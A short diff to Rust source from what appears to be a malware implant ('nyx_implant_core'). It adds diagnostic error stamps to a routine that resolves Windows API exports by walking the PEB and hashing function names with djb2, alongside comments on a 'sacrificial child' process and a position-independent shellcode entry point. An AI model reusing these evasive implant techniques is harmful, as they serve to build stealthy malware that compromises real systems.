@@ -119,6 +119,8 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
     if let Some(a) = nyx_implant_core::resolve::export_addr(module, func) {
         return Some(a);
     }
+    // Diagnostic: PEB-walk path failed.
+    stamp_diag(0xC4);
     // The sacrificial child's loader never runs (kernel32 is not even
     // mapped — proven on windows-latest: reading the parent's kernel32 base
     // in the child returns STATUS_PARTIAL_COPY while ntdll reads fine), so
@@ -134,12 +136,17 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
         options(nostack, preserves_flags, readonly),
     );
     if base == 0 {
+        stamp_diag(0xC5);
         return None;
     }
-    nyx_implant_core::resolve::export_addr_by_hash_pub(
+    let r = nyx_implant_core::resolve::export_addr_by_hash_pub(
         base as *mut u8,
         nyx_implant_core::resolve::djb2(func),
-    )
+    );
+    if r.is_none() {
+        stamp_diag(0xC6);
+    }
+    r
 }
 
 /// PIC entry point — blob offset 0 after extraction. `packed` (rcx) points at
